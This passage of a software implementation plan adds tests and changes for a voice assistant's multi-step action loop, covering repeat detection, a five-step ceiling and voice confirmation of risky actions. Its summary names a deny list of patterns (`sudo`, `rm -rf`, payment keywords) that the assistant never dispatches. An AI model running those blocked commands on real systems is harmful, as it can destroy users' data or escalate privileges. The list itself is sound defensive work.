Note: `UI:FOCUS` is SAFE per `safety.classify`, even before `gui_actions.py` exists — but the loop will call `dispatch_action`, which currently returns `f"Unknown action: {kind}"` for `UI`. We override `dispatch_action` in the test so the kind doesn't matter.

- [ ] **Step 2: Run and confirm it passes (we already accept `max_steps` arg)**

Run: `uv run pytest tests/test_server_loop.py::test_action_loop_runs_two_safe_steps -v`
Expected: PASS — the helper already loops over `range(max_steps)`.

(The failing assertion would only appear if step 1 of the FakeRouter response weren't consumed. If this test passes immediately, that's fine — it's a regression guard for Task 3.4.)

- [ ] **Step 3: Commit the guard test**

```bash
git add tests/test_server_loop.py
git commit -m "test(server): cover two-step action loop"
```

---

### Task 3.2: Repeat detection

**Files:**

- Modify: `server.py` (`_run_action_loop`)
- Modify: `tests/test_server_loop.py`

- [ ] **Step 1: Write failing test**

Append to `tests/test_server_loop.py`:

```python
def test_action_loop_breaks_on_repeated_action(monkeypatch):
    fake = FakeRouter(
        [
            "Looking. [ACTION:CALENDAR]",
            "Looking again. [ACTION:CALENDAR]",
            "Should not be reached.",
        ]
    )
    monkeypatch.setattr(server, "_router", fake)

    calls = []

    async def fake_dispatch(tag):
        calls.append(tag)
        return "0 events"

    monkeypatch.setattr(server, "dispatch_action", fake_dispatch)

    raw, steps, pending = run(
        server._run_action_loop(
            messages=[{"role": "user", "content": "what's on?"}],
            system="sys",
            task="voice",
            max_steps=5,
        )
    )
    assert len(calls) == 1  # second call short-circuited  # nosec B101
    assert len(steps) == 1  # nosec B101
    assert pending is None  # nosec B101
    assert len(fake.responses) == 1  # third response never consumed  # nosec B101
```

- [ ] **Step 2: Run and confirm failure**

Run: `uv run pytest tests/test_server_loop.py::test_action_loop_breaks_on_repeated_action -v`
Expected: FAIL — current code calls dispatch twice.

- [ ] **Step 3: Add repeat detection in `_run_action_loop`**

In `_run_action_loop`, right after extracting `tag = m.group(1)`, add:

```python
        if steps and steps[-1][0] == tag:
            return raw, steps, None
```

- [ ] **Step 4: Run and confirm pass**

Run: `uv run pytest tests/test_server_loop.py -v`
Expected: all tests PASS.

- [ ] **Step 5: Commit**

```bash
git add server.py tests/test_server_loop.py
git commit -m "feat(server): break action loop on immediate repeats"
```

---

### Task 3.3: MAX_STEPS reached coverage

**Files:**

- Modify: `tests/test_server_loop.py`

- [ ] **Step 1: Add test**

Append to `tests/test_server_loop.py`:

```python
def test_action_loop_stops_at_max_steps(monkeypatch):
    fake = FakeRouter(
        [
            "Step A. [ACTION:UI:OBSERVE]",
            "Step B. [ACTION:UI:FOCUS:Chrome]",
            "Step C. [ACTION:SEARCH:python]",
            "Should not run.",
        ]
    )
    monkeypatch.setattr(server, "_router", fake)

    async def fake_dispatch(tag):
        return f"ran {tag}"

    monkeypatch.setattr(server, "dispatch_action", fake_dispatch)

    raw, steps, pending = run(
        server._run_action_loop(
            messages=[{"role": "user", "content": "do three things"}],
            system="sys",
            task="voice",
            max_steps=3,
        )
    )
    assert pending is None  # nosec B101
    assert len(steps) == 3  # nosec B101
    assert len(fake.responses) == 1  # fourth never consumed  # nosec B101
```

- [ ] **Step 2: Run and confirm pass**

Run: `uv run pytest tests/test_server_loop.py::test_action_loop_stops_at_max_steps -v`
Expected: PASS.

- [ ] **Step 3: Commit**

```bash
git add tests/test_server_loop.py
git commit -m "test(server): cover max_steps ceiling"
```

---

### Task 3.4: Lift `handle_message` to `MAX_STEPS = 5`

**Files:**

- Modify: `server.py` (`handle_message`)

- [ ] **Step 1: Add `MAX_STEPS` constant near `ACTION_RE`**

In `server.py`, add:

```python
MAX_STEPS = 5
```

- [ ] **Step 2: Replace the `max_steps=1` argument in `handle_message`**

In `handle_message`, change `max_steps=1` to `max_steps=MAX_STEPS`.

- [ ] **Step 3: Run the full test suite**

Run: `uv run pytest -v`
Expected: all tests PASS.

- [ ] **Step 4: Smoke-check the import graph**

Run: `uv run python -m compileall server.py safety.py llm_router.py planner.py`
Expected: no errors.

- [ ] **Step 5: Manual sanity (do NOT skip)**

Start the app: `scripts/start.sh`

Verify in a browser at `http://localhost:5173`:

1. Wake → "오늘 일정 알려줘" → should narrate calendar summary (single SAFE action, parity with old behavior).
2. Wake → "할 일에 우유 사기 추가해" → should ask "Proceed? (yes/no)" rather than silently creating. Reply "yes" → task is added.
3. Wake → "Terminal에서 ls 실행해" → should ask for confirmation. Reply "no" → cancelled message, no Terminal window.
4. Wake → idle 35 seconds → say something unrelated. The expired pending should not affect the new turn.

If any of these fail, revert the commit and investigate before proceeding.

- [ ] **Step 6: Commit**

```bash
git add server.py
git commit -m "feat(server): raise MAX_STEPS to 5"
```

---

## Verification Summary

The shippable state after this plan is:

- `safety.py` covers classification + reply parsing with ≥30 unit cases.
- `handle_message` runs through a bounded loop (≤5 steps).
- Risky actions never dispatch without a voice "yes".
- Blocked patterns (`sudo`, `rm -rf`, payment keywords) never dispatch at all.
- All existing tests still pass; new test files: `tests/test_safety.py`, `tests/test_server_pending.py`, `tests/test_server_loop.py`.

Minimum verification: `uv run pytest -v` (must be green) + the four manual checks in Task 3.4 Step 5.

## Follow-ups (separate plans)

1. `gui_actions.py` with `[ACTION:UI:OBSERVE|FOCUS|SCROLL]` (read-only AX), then `CLICK/TYPE/KEY`.
2. `computer_use.py` with `[ACTION:COMPUTER:goal]`.
3. Optional `step` WebSocket message + frontend progress indicator.
